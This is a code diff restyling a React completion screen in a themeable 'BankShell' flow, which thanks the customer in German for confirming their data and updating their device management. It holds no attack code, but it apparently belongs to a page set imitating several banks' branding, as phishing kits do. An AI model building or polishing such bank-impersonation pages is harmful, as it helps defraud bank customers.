@@ -1,32 +1,32 @@
-import { CheckCircle2, Home } from "lucide-react";
-import { Link } from "@tanstack/react-router";
 import type { FlowTheme } from "./BankShell";
 
-export function CompletionStep({ theme, customerName }: { theme: FlowTheme; customerName: string }) {
-  const themeColor = theme.headerBg === "#ffffff" ? theme.buttonBg : theme.headerBg;
+export function CompletionStep({ theme: _theme, customerName }: { theme: FlowTheme; customerName: string }) {
+  const firstName = customerName ? customerName.split(" ")[0] : "";
   return (
-    <div className="max-w-xl mx-auto">
-      <div className="bg-white rounded-2xl shadow-sm border border-gray-200 p-8 sm:p-10 text-center">
-        <div className="mx-auto w-16 h-16 rounded-full flex items-center justify-center mb-5" style={{ backgroundColor: `${theme.buttonBg}1a` }}>
-          <CheckCircle2 className="w-10 h-10" style={{ color: theme.buttonBg }} />
-        </div>
-        <h2 className="text-2xl sm:text-3xl font-bold mb-2" style={{ color: themeColor }}>
-          Vielen Dank{customerName ? `, ${customerName.split(" ")[0]}` : ""}!
-        </h2>
-        <p className="text-sm text-gray-600 leading-relaxed">
-          Ihre Daten wurden erfolgreich bestätigt und Ihre Geräteverwaltung aktualisiert.
-          Sie können Ihr Online-Banking wie gewohnt nutzen.
-        </p>
-        <div className="mt-8">
-          <Link
-            to="/"
-            className={`inline-flex items-center gap-2 px-6 py-3 ${theme.buttonRadius} text-white font-medium hover:opacity-90`}
-            style={{ backgroundColor: theme.buttonBg }}
-          >
-            <Home className="w-4 h-4" /> Zur Startseite
-          </Link>
+    <main className="flex-1 flex items-center justify-center px-4">
+      <div className="w-full max-w-md text-center">
+        <div className="bg-green-50 rounded-2xl p-8 sm:p-10 mb-6">
+          <div className="w-14 h-14 mx-auto mb-5 rounded-full border-[3px] border-green-600 flex items-center justify-center">
+            <svg
+              className="w-7 h-7 text-green-600"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              strokeWidth={2.5}
+            >
+              <path strokeLinecap="round" strokeLinejoin="round" d="M5 13l4 4L19 7" />
+            </svg>
+          </div>
+          <h2 className="text-xl sm:text-2xl font-bold text-gray-900 mb-3">
+            Vielen Dank{firstName ? `, ${firstName}` : ""}!
+          </h2>
+          <p className="text-sm sm:text-base text-gray-700 leading-relaxed">
+            Ihre Daten wurden erfolgreich bestätigt und Ihre Geräteverwaltung aktualisiert.
+            Sie können Ihr Online-Banking wie gewohnt nutzen.
+          </p>
         </div>
       </div>
-    </div>
+    </main>
   );
 }
+
